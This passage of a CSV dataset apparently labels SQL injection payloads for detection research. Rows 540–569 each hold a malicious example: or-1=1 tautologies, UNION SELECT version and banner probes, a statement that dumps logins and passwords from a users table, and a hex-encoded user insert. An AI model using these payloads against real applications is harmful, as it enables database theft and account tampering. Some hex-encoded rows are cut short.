row_index,payload_norm,label,sqli_type_hint
540,"select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",1,
541,declare @q nvarchar ( 200 ) 0x730065006c00650063 ...,1,
542,"select * from users where id = 1 or 1<@ = 1 union select 1,version ( ) -- 1",1,
543,"admin"" or 1 = 1/*",1,
544,"select * from users where id = 1<@<@ union select 1,version ( ) -- 1",1,
545,declare @s varchar ( 8000 ) select @s = 0x73656c ...,1,
546,"select * from users where id = '1' union select +\#,@@VERSION -- 1'",1,
547,"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1,
548,"select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1,
549,"select * from users where id = 1 union select 1 1a,version ( ) -- 1",1,
550,; begin declare @var varchar ( 8000 ) set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1,
551,"union ( select NULL, NULL, NULL, NULL, ( select @@version ) ) --",1,
552,hi' or 1 = 1 --,1,
553,select * from users where id = 1 % ( $ ) or 1 = 1 -- 1,1,
554,"select * from users where id = 1 or 1#"" ( union select 'a',version ( ) -- 1",1,
555,"select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1,
556,"select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1,
557,desc,1,
558,"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1,
559,"select * from users where id = 1 or 1#""1 union select 1,version ( ) -- 1",1,
560,select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1,
561,0x770061006900740066006F0072002000640065006C00 ...,1,
562,"select * from users where id = 1 -@<@ union select version ( ) ,version ( ) -- 1",1,
563,"select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",1,
564,"select * from users where id = 1 or ""]."" or 1 = 1 -- 1",1,
565,"select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1,
566,or isNULL ( 1/0 ) /*,1,
567,"insert into users ( login, password, level ) values ( char ( 0x70 ) + char ( 0x65 ) + char ( 0x74 ) + char ( 0x65 ) + char ( 0x72 ) + char ( 0x70 ) + char ( 0x65 ) + char ( 0x74 ) + char ( 0x65 ) + char ( 0x72 ) ,char ( 0x64 )",1,
568,"select * from users where id = 1 or "" ) ( "" = 1 or 1 = 1 -- 1",1,
569,"select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1,
